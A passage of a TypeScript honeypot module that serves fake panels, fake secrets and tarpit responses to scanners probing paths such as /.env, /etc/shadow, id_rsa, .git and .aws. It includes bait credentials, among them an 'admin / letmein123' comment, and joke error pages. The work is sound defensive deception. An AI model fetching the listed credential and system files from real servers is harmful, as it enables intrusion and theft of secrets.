        <value><string>wp.newComment</string></value>
        <value><string>wp.editComment</string></value>
      </data></array></value>
    </param>
  </params>
</methodResponse>
`;

const FAKE_XMLRPC_POST_ONLY = `XML-RPC server accepts POST requests only.
`;

const FAKE_GRAPHQL =
  '{"errors":[{"message":"Cannot query field \\"password\\" on type \\"User\\". Did you mean \\"author\\"?","locations":[{"line":2,"column":3}],"extensions":{"code":"GRAPHQL_VALIDATION_FAILED"}},{"message":"GraphQL introspection is not allowed by this server configuration, but the query contained __schema or __type","extensions":{"code":"INTROSPECTION_DENIED"}}],"data":null}\n';

const FAKE_ACTUATOR_ENV = `{"activeProfiles":["prod"],"defaultProfiles":["default"],"propertySources":[{"name":"server.localhost","properties":{}},{"name":"systemProperties","properties":{"java.version":{"value":"1.8.0_202"},"java.home":{"value":"/usr/lib/jvm/java-8-openjdk-amd64/jre"},"os.name":{"value":"Linux"},"user.name":{"value":"fh_app"},"sun.java.command":{"value":"fasthand.jar --spring.config.location=file:/var/www/html/.env"}}},{"name":"systemEnvironment","properties":{"HOME":{"value":"/home/fh_app"},"PATH":{"value":"(/home/fh_app/.local/bin:/usr/local/bin:/usr/bin:/bin)"},"DB_PASSWORD":{"value":"(correct-horse-battery-staple)"},"AWS_SECRET_ACCESS_KEY":{"value":"(wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY)"}}},{"name":"config file (file:/var/www/html/.env)","properties":{"fasthand.canary":{"value":"fh-prod-6f2a9c"}},"propertySourceNames":["prod","common"]}]}`;

const FAKE_ACTUATOR_HEALTH = `{"status":"UP","components":{"db":{"status":"UP","details":{"database":"MySQL","validationQuery":"isValid()"}},"diskSpace":{"status":"UP","details":{"total":42949672960,"free":1207959470,"threshold":10485760}},"redis":{"status":"UP","details":{"version":"6.2.6"}}}}
`;

const FAKE_ACTUATOR_LINKS = `{"_links":{"self":{"href":"http://fasthandstudio.asia/actuator","templated":false},"health":{"href":"http://fasthandstudio.asia/actuator/health","templated":false},"health-path":{"href":"http://fasthandstudio.asia/actuator/health/{*path}","templated":true},"info":{"href":"http://fasthandstudio.asia/actuator/info","templated":false},"env":{"href":"http://fasthandstudio.asia/actuator/env","templated":false},"beans":{"href":"http://fasthandstudio.asia/actuator/beans","templated":false},"dump":{"href":"http://fasthandstudio.asia/actuator/dump","templated":false},"loggers":{"href":"http://fasthandstudio.asia/actuator/loggers","templated":false}}}`;

const FAKE_TELESCOPE = `{"data":[],"links":{"first":"http://fasthandstudio.asia/telescope?page=1","last":"http://fasthandstudio.asia/telescope?page=1","prev":null,"next":null},"meta":{"current_page":1,"from":null,"last_page":1,"next_page":null,"path":"/telescope","to":null,"total":0},"message":"no monitored entries in the retention window - the last recording is 418 days old and the operator has moved on"}
`;

function panelHtml(posted: boolean): string {
  const message = posted
    ? `<div id="login_error"><strong>Error</strong>: The password you entered for the username <em>admin</em> is incorrect. <a href="#">Lost your password?</a></div>`
    : "";
  const locked = posted
    ? `<p class="lockout">Your form login has been limited for the next <strong>15</strong> minutes. If this was a mistake, contact <a href="mailto:noreply@fasthandstudio.asia">noreply@fasthandstudio.asia</a>.</p>`
    : "";
  return `<!doctype html><html lang="en-US"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="robots" content="noindex,nofollow">
<meta name="generator" content="WordPress 6.4.3">
<title>Log In &laquo; FastHand Studio</title>
<link rel="https://api.w.org/" href="/wp-json/">
<style>
html{background:#f1f2f3}body{background:transparent;color:#3c434a;font:400 14px/1.4 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Oxygen-Sans,Ubuntu,Cantarell,"Helvetica Neue",sans-serif;margin:0;padding:0;min-height:100vh}
form{margin:24px 0 0;padding:26px;background:#fff;border:1px solid #dcdcde;box-shadow:0 1px 3px rgba(0,0,0,.04)}
label{font-size:14px;color:#3c434a}input[type=password],input[type=text]{box-sizing:border-box;font-size:16px;margin:0 0 16px;padding:18px 16px;border:1px solid #dcdcde;border-radius:4px;box-shadow:inset 0 1px 2px rgba(0,0,0,.07);background:#fff;color:#3c434a;width:100%;line-height:1}
input[type=checkbox]{width:24px;height:24px;margin:0 8px 0 0;vertical-align:middle}
#nav #nav a,.submit input{color:#2271b1}
.submit{padding:0 0 24px;margin:0;font-family:HelveticaNeue-Light,HelveticaNeueLight,HelveticaLight,Helvetica,Arial,sans-serif}
.submit input,.wp-core-ui .button-primary{width:100%;vertical-align:middle!important;border:1px solid #2271b1;background:#2271b1;color:#fff;font-size:14px;line-height:2.15;padding:0 12px;cursor:pointer;border-radius:3px;appearance:button}
#login h1 a{display:block;margin:0 0 24px;text-decoration:none;font-size:20px;font-weight:600;color:#1d2327;text-align:center;line-height:1.4}
#login{display:flex;flex-direction:column;margin:8% auto;padding:0;width:320px;position:relative}
body.login div#login h1{margin:0;text-align:center}
#login form p.message,#login form .field-recovery{margin:0 0 16px}
.message,div.updated,.press-this-plugin-message,.login .message{background:#fff;border:1px solid #c3c4c7;border-left-width:4px;border-left-color:#2271b1;padding:10px 12px;margin:0 0 16px;font-size:13px;line-height:1.5}
#login_error,div.error,.login .error,.press-this .notice-error{background:#fff;border:1px solid #d63638;border-left-width:4px;border-left-color:#d63638;padding:12px;margin:0 0 16px;font-size:13px;line-height:1.5;box-shadow:0 1px 2px rgba(0,0,0,.05)}
.forgetmenot{display:inline-block}.lockout{font-size:12px;color:#646970;margin:16px 0 0}
#backtoblog{font-size:13px;margin:24px 0 0;padding:20px 0;text-align:center;color:#646970}
a{color:#2271b1;text-decoration:underline}
</style></head><body class="login login-action-login wp-core-ui locale-en-us">
<div id="login">
<h1><a href="https://wordpress.org/" title="Powered by WordPress">FastHand Studio</a></h1>
${message}
<form name="loginform" id="loginform" method="post">
<p class="field-description"><label for="user_login">Username or Email Address</label>
<input type="text" name="log" id="user_login" class="input" value="" size="20" autocomplete="username"></p>
<p class="field-description"><label for="user_pass">Password</label>
<input type="password" name="pwd" id="user_pass" class="input" value="" size="20" autocomplete="current-password"></p>
<p class="forgetmenot"><input name="rememberme" type="checkbox" id="rememberme" value="forever">
<label for="rememberme">Remember Me</label></p>
<p class="submit"><input type="submit" name="wp-submit" id="wp-submit" class="button button-primary button-large" value="Log In"></p>
<input type="hidden" name="testcookie" value="1">
</form>
<p id="nav"><a href="#">Lost your password?</a></p>
${locked}
</div>
<div id="backtoblog"><a href="/">&larr; Go to FastHand Studio</a></div>
<!-- staging-only account: admin / letmein123. Remove before launch. (added 2019, still here) -->
</body></html>`;
}

const TEAPOT = `            _.._
         .-'   _  '-.
        /     .-'    /|
       |     /      / |
       |    |      /  /
        \\   |     /  /
         '-.|    '--'
            ''  '-.'

  418 I'm a teapot

The requested resource refused to brew coffee because it is, permanently, a
teapot. Your tool asked for /wp-login.php; the pot answered, and keeps
answering, and will answer again tomorrow.

Status: the kettle has been on since 2019. Nothing boils. The tea is decaf.
Escalation: not available on this vhost. A pot does not escalate; it steeps.
Ask nicely and it may answer again, in the same voice, forever.

Recommended next steps:
  - close the terminal
  - drink actual water
  - ship something small today

Retry-After: 86400
`;

const RATE_LIMITED = `<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head><title>429 Too Many Requests</title>
<meta name="robots" content="noindex,nofollow"></head><body>
<h1>Too Many Requests</h1>
<p>The server is temporarily unable to service your request due to the uptime
limit being reached. Please lower your request rate; a human reviewing the
access log has been notified, and the limits on this vhost are set by that
human, who is currently enjoying the log.</p>
<p>Your recent requests, for reference:<br>
GET /wp-login.php 401, POST /xmlrpc.php 200, GET /.env 200,
GET /backup/database.sql.gz 200.</p>
<hr>
<address>Apache/2.2.17 (Unix) Server at fasthandstudio.asia Port 80</address>
</body></html>
`;

export function rateLimitedPage(): string {
  return RATE_LIMITED;
}

const TRACES = [
  "mod_evasive: rule 942100, phase 2, verdict=deferred",
  "mod_security: anomaly score 12, threshold 5, action=continue",
  "ruleset quickout=0 paranoia=4, the flagellum is on the left",
  "waf-2.4: slow path engaged, hop 3, tea is steeping",
  "rate-limit bucket /24, tokens 0, refill scheduled",
  "trace 01962f4a: origin returned the usual pot",
];

export function traceFor(n: number): string {
  return TRACES[n % TRACES.length] ?? "rule 942100";
}

export function buildDecoy(pathname: string, method: string): Decoy {
  const kind = classify(pathname) ?? "panel";

  if (kind === "exec") {
    if (pathname === "/graphql" || pathname === "/_graphql") {
      return {
        kind,
        path: pathname,
        status: method === "GET" ? 400 : 200,
        contentType: "application/json",
        body: FAKE_GRAPHQL,
        tarpit: false,
      };
    }
    if (pathname.startsWith("/telescope") || pathname.startsWith("/_debugbar")) {
      return {
        kind,
        path: pathname,
        status: 200,
        contentType: "application/json",
        body: FAKE_TELESCOPE,
        tarpit: false,
      };
    }
    if (pathname === "/server-status" || pathname === "/server-info") {
      return {
        kind,
        path: pathname,
        status: 200,
        contentType: "text/plain; charset=utf-8",
        body: FAKE_SERVER_STATUS,
        tarpit: true,
      };
    }
    if (
      pathname.endsWith("phpinfo") ||
      pathname.endsWith("phpinfo.php") ||
      pathname.endsWith("info.php")
    ) {
      return {
        kind,
        path: pathname,
        status: 200,
        contentType: "text/html; charset=utf-8",
        body: fakePhpinfo(),
        tarpit: true,
      };
    }
    return {
      kind,
      path: pathname,
      status: 200,
      contentType: "text/plain; charset=utf-8",
      body: FAKE_SHELL,
      tarpit: true,
    };
  }

  if (kind === "panel") {
    if (pathname === "/xmlrpc.php") {
      return {
        kind,
        path: pathname,
        status: method === "POST" ? 200 : 405,
        contentType: method === "POST" ? "text/xml; charset=UTF-8" : "text/html; charset=UTF-8",
        body: method === "POST" ? FAKE_XMLRPC : FAKE_XMLRPC_POST_ONLY,
        tarpit: true,
      };
    }
    if (pathname === "/actuator/env") {
      return {
        kind,
        path: pathname,
        status: 200,
        contentType: "application/json",
        body: FAKE_ACTUATOR_ENV,
        tarpit: true,
      };
    }
    if (pathname === "/actuator/health") {
      return {
        kind,
        path: pathname,
        status: 200,
        contentType: "application/json",
        body: FAKE_ACTUATOR_HEALTH,
        tarpit: false,
      };
    }
    if (pathname === "/actuator") {
      return {
        kind,
        path: pathname,
        status: 200,
        contentType: "application/json",
        body: FAKE_ACTUATOR_LINKS,
        tarpit: false,
      };
    }
    return {
      kind,
      path: pathname,
      status: method === "POST" ? 401 : 200,
      contentType: "text/html; charset=utf-8",
      body: panelHtml(method === "POST"),
      tarpit: false,
    };
  }

  // secrets
  if (pathname === "/.git/HEAD") {
    return {
      kind: "secrets",
      path: pathname,
      status: 200,
      contentType: "text/plain; charset=utf-8",
      body: FAKE_GIT_HEAD,
      tarpit: false,
    };
  }
  if (pathname.startsWith("/.git/logs")) {
    return {
      kind: "secrets",
      path: pathname,
      status: 200,
      contentType: "text/plain; charset=utf-8",
      body: FAKE_GIT_REFLOG,
      tarpit: true,
    };
  }
  if (pathname.startsWith("/.git/")) {
    return {
      kind: "secrets",
      path: pathname,
      status: 200,
      contentType: "text/plain; charset=utf-8",
      body: FAKE_GIT_CONFIG,
      tarpit: false,
    };
  }
  if (pathname.startsWith("/.aws/")) {
    return {
      kind: "secrets",
      path: pathname,
      status: 200,
      contentType: "text/plain; charset=utf-8",
      body: FAKE_AWS,
      tarpit: true,
    };
  }
  if (
    pathname === "/etc/passwd" ||
    pathname === "/etc/shadow" ||
    pathname === "/proc/self/environ"
  ) {
    return {
      kind: "secrets",
      path: pathname,
      status: 200,
      contentType: "text/plain; charset=utf-8",
      body: FAKE_PASSWD,
      tarpit: true,
    };
  }
  if (
    pathname.includes("id_rsa") ||
    pathname.includes("id_ed25519") ||
    pathname.endsWith(".pem") ||
    pathname.endsWith(".key") ||
    pathname.endsWith(".pkcs12")
  ) {
    return {
      kind: "secrets",
      path: pathname,
      status: 200,
      contentType: "application/x-pem-file",
      body: FAKE_ID_RSA,
      tarpit: true,
    };
  }
  if (pathname.endsWith(".sql") || pathname.endsWith(".sql.gz") || pathname.endsWith(".sqlite")) {
    return {
      kind: "secrets",
      path: pathname,
      status: 200,
      contentType: "application/sql",
      body: FAKE_SQL,
      tarpit: true,
    };
  }
  if (pathname.endsWith(".log")) {
    return {
      kind: "secrets",
      path: pathname,
      status: 200,
      contentType: "text/plain; charset=utf-8",
      body: FAKE_LOG,
      tarpit: true,
    };
  }
  if (
    pathname.endsWith(".yml") ||
    pathname.endsWith(".yaml") ||
    pathname.endsWith(".ini") ||
    pathname.endsWith(".conf")
  ) {
    return {
      kind: "secrets",
      path: pathname,
      status: 200,
      contentType: "text/plain; charset=utf-8",
      body: FAKE_YML,
      tarpit: true,
    };
  }
  if (pathname.endsWith(".swp") || pathname.endsWith(".save")) {
    return {
      kind: "secrets",
      path: pathname,
      status: 200,
      contentType: "application/octet-stream",
      body: FAKE_SWP,
      tarpit: true,
    };
  }
  if (pathname.endsWith(".bak") || pathname.endsWith(".old")) {
    return {
      kind: "secrets",
      path: pathname,
      status: 200,
      contentType: "text/plain; charset=utf-8",
      body: FAKE_BAK,
      tarpit: true,
    };
  }
  if (
    pathname.endsWith("/backup/") ||
    pathname.endsWith("/backups/") ||
    pathname.endsWith("/dumps/") ||
    pathname.endsWith("/db-dumps/")
  ) {
    return {
      kind: "secrets",
      path: pathname,
      status: 200,
      contentType: "text/html; charset=utf-8",
      body: FAKE_INDEX,
      tarpit: true,
    };
  }
  if (pathname.endsWith(".zip") || pathname.endsWith(".tar.gz") || pathname.endsWith(".7z")) {
    return {
      kind: "secrets",
      path: pathname,
      status: 200,
      contentType: "text/html; charset=utf-8",
      body: FAKE_INDEX,
      tarpit: true,
    };
  }
  if (pathname.endsWith(".php")) {
    return {
      kind: "secrets",
      path: pathname,
      status: 200,
      contentType: "text/plain; charset=utf-8",
      body: FAKE_WP_CONFIG,
      tarpit: true,
    };
  }
  if (pathname === "/.git-credentials") {
    return {
      kind: "secrets",
      path: pathname,
      status: 200,
      contentType: "text/plain; charset=utf-8",
      body: "https://deploy-bot:hunter2@git.example.invalid\nhttps://fh_ci:%70%61%73%73%77%6f%72%64@10.42.7.19:2222\n",
      tarpit: true,
    };
  }
  if (pathname === "/.gitignore") {
    return {
      kind: "secrets",
      path: pathname,
      status: 200,
      contentType: "text/plain; charset=utf-8",
      body: FAKE_GITIGNORE,
      tarpit: false,
    };
  }
  if (pathname.startsWith("/.git/refs/") || pathname === "/.DS_Store") {
    return {
      kind: "secrets",
      path: pathname,
      status: 200,
      contentType: pathname.startsWith("/.git/")
        ? "text/plain; charset=utf-8"
        : "text/html; charset=utf-8",
      body: pathname.startsWith("/.git/")
        ? "4d9e6b3f07a5c2d1e8b9f0c3a7d6e51428f22c1a\n"
        : FAKE_INDEX,
      tarpit: false,
    };
  }
  if (pathname === "/.bash_history") {
    return {
      kind: "secrets",
      path: pathname,
      status: 200,
      contentType: "text/plain; charset=utf-8",
      body: FAKE_BASH_HISTORY,
      tarpit: true,
    };
  }
  return {
    kind: "secrets",
    path: pathname,
    status: 200,
    contentType: "text/plain; charset=utf-8",
    body: FAKE_ENV,
    tarpit: true,
  };
}

export function teapotResponse(): string {
  return TEAPOT;
}
